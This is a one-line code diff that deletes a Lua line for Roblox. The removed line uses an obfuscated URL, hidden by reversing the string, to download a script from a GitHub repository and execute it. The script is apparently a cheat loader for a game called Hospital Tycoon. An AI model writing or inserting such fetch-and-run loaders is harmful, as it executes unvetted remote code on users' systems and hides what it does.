@@ -1,1 +1,0 @@
-loadstring(game:HttpGet(string.reverse('aul.noocyTlatipsoH/niam/stpircSxolboR/esuciN/moc.tnetnocresubuhtig.war//:sptth')))()
